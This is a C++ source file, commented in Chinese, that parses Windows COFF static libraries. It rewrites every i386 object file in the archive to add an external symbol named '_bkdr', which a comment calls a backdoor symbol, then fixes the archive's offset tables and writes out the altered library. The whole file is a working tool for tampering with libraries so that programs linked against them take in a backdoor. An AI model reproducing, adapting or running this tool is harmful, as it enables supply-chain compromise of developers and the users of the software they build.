#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <Windows.h>
#include <list>
#include <assert.h>

using std::list;

#define ARMAG "!<arch>\n"
#define SARMAG 8

struct ar_hdr {
	char ar_name[16];
	char ar_date[12];
	char ar_uid[6];
	char ar_gid[6];
	char ar_mode[8];
	char ar_size[10];
	char ar_fmag[2];
};

enum MemberType{
	TYPE_HEAD_1 = 0,
	TYPE_HEAD_2,
	TYPE_DIR,
	TYPE_OBJ_FILE
};

struct Member{
	DWORD dwType;

	DWORD dwOffsetInFile;
	DWORD dwNewOffsetInFile;

	ar_hdr header;
	int  dwDataSize;
	char *data;
};


struct LibCtx{
	list<Member*> m_Members;
};

DWORD ToBigEndian(DWORD val){
	DWORD dwResult = 0;
	for (int i = 0; i < 4; i++){
		dwResult = (dwResult << 8) + (val & 0xff);
		val >>= 8;
	}
	return dwResult;
}

void PrintHdrName(ar_hdr*hdr){
	printf("Member Name: ");
	for (int i = 0; hdr->ar_name[i] != ' '; i++) 
		putchar(hdr->ar_name[i]);
}


/*
	第一段数据:
	DWORD NumbersOfSymbols;							(大端)
	DWORD dwOffset[], 符号所在的Obj在lib文件中的偏移.	(大端)
	符号字符串


	第二段数据:
	DWORD NumberOfObjs;      //
	DWORD dwOffsetOfObjs[];  //

	DWORD NumberOfSymbols;
	WORD  IndexOfSymbolObj[];
	字符串表.
*/

struct Header1{
	DWORD dwNumberOfSymbols;
	DWORD dwObjOffset[1];
};

struct Header2{
	DWORD NumberOfObjs;
	DWORD dwOffsetOfObjs[1];
};



typedef struct _FILEHEADER
{
	unsigned short machine;     // 平台名
	unsigned short numberOfSections;// 区段数
	unsigned long  timeDateStamp;   // 时间戳
	unsigned long  pointerToSymbolTable;		// 符号表文件偏移
	unsigned long  numberOfSymbols;				// 符号总个数
	unsigned short sizeOfOptionalHeader;		// 可选头长度
	unsigned short characteristics;				// 文件标记

} FILEHEADER, *PFILEHEADER;

/*
	最大为8个字节的,以’\0’为结尾的ASCII字符串.用于记录区段的名字
	.区段的名字有些是特定意义的区段. 如果区段名的数量大于8个字节,
	则name的第一字节是一个斜杠字符:’/’,接着就是一个数字,
	这个数字就是字符串表的一个索引.它将索引到一个具体的区段名.


	之后的数据:

	如果name == '//',则数据是文件的路径(算是个字符串表)。
	之后紧跟着的n个member 的名称都是 / + name在目录数据中的偏移(就是上面提到的字符串表).

	否则:
	name就是文件名,数据就是文件的数据.

	注意每个name都以/开头.
*/

typedef struct  _SECTIONHEADER
{
	char name[8];							// 段名
	unsigned long  virtualSize;			     // 虚拟大小  没有用
	unsigned long  virtualAddress;		     // 虚拟地址 没有用
	unsigned long  sizeOfRawData;			 // 区段数据的字节数
	unsigned long  pointerToRawData;		 // 区段数据偏移
	unsigned long  pointerToRelocations;     // 区段重定位表偏移
	unsigned long  pointerToLinenumbers;     // 行号表偏移
	unsigned short  numberOfRelocations;     // 重定位表个数
	unsigned short  numberOfLinenumbers;     // 行号表个数
	unsigned long  characteristics;          // 段标识
}SECTIONHEADER, *PSECTIONHEADER;


#pragma pack(push, 2)
typedef struct _SYMBOL
{
	union {
		char name[8];               // 符号名称
		struct {
			unsigned long zero;     // 字符串表标识
			unsigned long offset;  // 字符串偏移
		};
	};
	unsigned long value;            // 符号值
	short          section;          // 符号所在段
	unsigned short type;            // 符号类型
	unsigned char Class;            // 符号存储类型
	unsigned char numberOfAuxSymbols;// 符号附加记录数
} SYMBOL, *PSYMBOL;
#pragma pack(pop)


typedef struct _STRIGTABLE{
	unsigned int Size;
	char         Data[1];
} STRIGTABLE, *PSTRIGTABLE;

/*
COFF x386 MAGIC
COFF Microsoft CIL Bytecode. 这个暂不支持.不太了解这个格式.
*/


void AddSymbol(char * coff, size_t size, char**out, size_t * out_size){
	int i = 0;
	char * coff_end = coff + size;
	*out = NULL;
	*out_size = 0;

	FILEHEADER* fileheader = (FILEHEADER*)coff;
	SECTIONHEADER* sectionHdr = NULL;
	SYMBOL * Symbols = NULL,*pNextSym;
	char *StringTable = NULL;
	char * strTableCopy = NULL;
	int k = 0;

	if (fileheader->machine != IMAGE_FILE_MACHINE_I386)
		return;

	sectionHdr = (SECTIONHEADER*)(coff + sizeof(FILEHEADER));
	Symbols = (SYMBOL*)(coff + fileheader->pointerToSymbolTable);

	pNextSym = Symbols;
	//numbers of symbols 包含了 aux的symbols......
	printf("numberOfSymbols : %d\n", fileheader->numberOfSymbols);

	for (int i = 0; i < fileheader->numberOfSymbols; i++){
		if (!k){
			//printf("Sym Name : %s \n", pNextSym->name);
			k = pNextSym->numberOfAuxSymbols;
		}
		else{
			k--;
		}
		pNextSym++;
	}

	StringTable = (char*)pNextSym;
	//拷贝字符串表.
	DWORD StrTableSize = coff_end - StringTable;
	strTableCopy = new char[StrTableSize];
	memcpy(strTableCopy, StringTable, StrTableSize);

	//输出段名.

	for (int i = 0; i < fileheader->numberOfSections; i++){
		
	}

	//在符号表内添加一项.
	memset(pNextSym->name, 0, 8);
	strcpy(pNextSym->name, "_bkdr");

	pNextSym->type = 0x20;
	pNextSym->section = 0;
	pNextSym->Class = IMAGE_SYM_CLASS_EXTERNAL;
	pNextSym->value = 0x0;
	pNextSym->numberOfAuxSymbols = 0;

	//////
	char * newCoff = new char[size + sizeof(SYMBOL)];
	memcpy(newCoff, coff, size);
	SYMBOL * newSymbols = (SYMBOL*)(newCoff + ((FILEHEADER*)newCoff)->pointerToSymbolTable);
	SYMBOL * AddSym = newSymbols;
	for (i = 0; i < ((FILEHEADER*)newCoff)->numberOfSymbols; i++){
		AddSym++;
	}

	memcpy(AddSym, pNextSym, sizeof(SYMBOL));
	
	//拷贝字符串表.
	memcpy(AddSym + 1, strTableCopy, StrTableSize);
	
	((FILEHEADER*)newCoff)->numberOfSymbols++;

	//由于符号表里面字符串的偏移是相对于字符串表的，所以不需要修改
	delete[]strTableCopy;
	//返回新的obj文件和大小.
	*out = newCoff;
	*out_size = size + sizeof(SYMBOL);
}



LibCtx * ParseLib(BYTE* buff,size_t len){
	//check headers.
	BYTE * it = buff,*end = buff + len;
	Member * member = NULL;
	DWORD dataSize = 0;
	ar_hdr temp = { 0 };

	if (memcmp(ARMAG, buff, SARMAG)){
		fprintf(stderr, "Invalid File!\n");
		return NULL;
	}
	it += SARMAG;
	
	////
	LibCtx * lib = new LibCtx;

	while (it < end){
		//read header 1.
		memcpy(&temp, it, sizeof(ar_hdr));
		PrintHdrName(&temp);
		//
		dataSize = atoll(temp.ar_size);

		printf("\t DataSize: %u\n", dataSize);

		member = new Member;
		member->dwOffsetInFile = it - buff;
		member->dwNewOffsetInFile = member->dwOffsetInFile;

		if (lib->m_Members.size() == 0)
			member->dwType = TYPE_HEAD_1;

		else if (lib->m_Members.size() == 1)
			member->dwType = TYPE_HEAD_2;
		else if (temp.ar_name[0] == '/' && temp.ar_name[1] == '/')
			member->dwType = TYPE_DIR;
		else
			member->dwType = TYPE_OBJ_FILE;
		
		member->header = temp;
		member->dwDataSize = dataSize;
		member->data = new char[dataSize];

		it += sizeof(ar_hdr);
		memcpy(member->data, it, dataSize);
		it += dataSize;

		//最后一个是 \n 用来对齐.
		if (dataSize & 1){
			printf("pad \n");
			it++;
		}
			
		lib->m_Members.push_back(member);
	}
	return lib;
}

void FixLib(LibCtx * lib){
	assert(lib);
	assert(lib->m_Members.size() > 2);


	//注意header1 里面的offset 是大端表示.
	Header1 * header1 = (Header1*)(lib->m_Members.front()->data);
	Header2 * header2 = NULL;

	DWORD dwNumbersOfSymbols = ToBigEndian(header1->dwNumberOfSymbols);
	for (int i = 0; i < dwNumbersOfSymbols; i++){
		//设置header 1里面新的偏移.

		for (auto it : lib->m_Members){
			if (it->dwType == TYPE_OBJ_FILE &&
				ToBigEndian(it->dwOffsetInFile) == header1->dwObjOffset[i]){
				header1->dwObjOffset[i] = ToBigEndian(it->dwNewOffsetInFile);
				break;
			}
		}
	}

	auto sec = lib->m_Members.begin();
	sec++;

	header2 = (Header2*)((*sec)->data);

	for (int i = 0; i < header2->NumberOfObjs; i++){
		//设置header 1里面新的偏移.
		for (auto it : lib->m_Members){
			if (it->dwType == TYPE_OBJ_FILE &&
				it->dwOffsetInFile == header2->dwOffsetOfObjs[i]){
				header2->dwOffsetOfObjs[i] = it->dwNewOffsetInFile;
				break;
			}
		}
	}
}

void DumpLib(LibCtx* lib,const char * FileName){
	FILE* fp = fopen(FileName, "wb");
	if (!fp){
		printf("Could not open %s \n", FileName);
		exit(-1);
	}

	fwrite(ARMAG, 1, SARMAG, fp);
	for (auto it : lib->m_Members){
		fwrite(&it->header, 1, sizeof(ar_hdr), fp);
		fwrite(it->data, 1, it->dwDataSize, fp);

		if (it->dwDataSize & 1)
			fwrite("\n", 1, 1, fp); 
	}

	fclose(fp);
}

void AddSymbol(LibCtx * lib){
	for (auto it = lib->m_Members.begin();
		it != lib->m_Members.end();it++){

		if ((*it)->dwType == TYPE_OBJ_FILE){
			Member * mem = (*it);
			size_t NewSize = 0;
			char * OutData = 0;
			
			//加入后门符号.
			AddSymbol(mem->data, mem->dwDataSize, &OutData, &NewSize);
			if (OutData && NewSize){
				//
				int OffsetDelta = 0;
				char szName[0x100] = { 0 };
				char szSize[0x100] = { 0 };

				for (int i = 0; i < sizeof(mem->header.ar_name); i++){
					if (mem->header.ar_name[i] == ' ')
						break;
					szName[i] = mem->header.ar_name[i];
				}

				printf("Write Symbol to %s Success\n", szName);

				delete[]mem->data;
				//计算offset delta 值。
				OffsetDelta = NewSize - mem->dwDataSize;
				mem->dwDataSize = NewSize;
				mem->data = OutData;
				
				//重新写入大小
				memset(mem->header.ar_size, ' ', sizeof(mem->header.ar_size));
				sprintf(szSize, "%u", mem->dwDataSize);
				memcpy(mem->header.ar_size, szSize, strlen(szSize));

				//调整之后所有Members的偏移.
				auto k = it;
				k++;
				for (; k != lib->m_Members.end(); k++) (*k)->dwNewOffsetInFile += OffsetDelta;
			}
		}
	}
}

int main(int argc,char * argv[]){
	FILE * fp = NULL;
	size_t len = 0;
	char * LibBuff = NULL;

	if (argc != 3){
		printf("Usage : %s <input lib path> <output lib path>\n",argv[0]);
		exit(1);
	}

	fp = fopen(argv[1], "rb");
	//fp = fopen("c:/Users/lenovo/Desktop/CLibParse/Release/jsond.lib", "rb");
	
	if (!fp){
		fprintf(stderr, "Could not open input lib file ： %s\n", argv[1]);
		exit(-1);
	}

	fseek(fp, 0, SEEK_END);
	len = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	//////
	LibBuff = new char[len];
	fread(LibBuff, 1, len, fp);
	fclose(fp);

	LibCtx * lib = ParseLib((BYTE*)LibBuff,len);
	if (!lib){
		fprintf(stderr, "Parse lib file failed!\n");
		exit(-2);
	}

	//给Obj文件添加外部符号.
	AddSymbol(lib);
	//
	FixLib(lib);
	//输出到文件
	DumpLib(lib, argv[2]);
	delete[]LibBuff;
	return 0;
}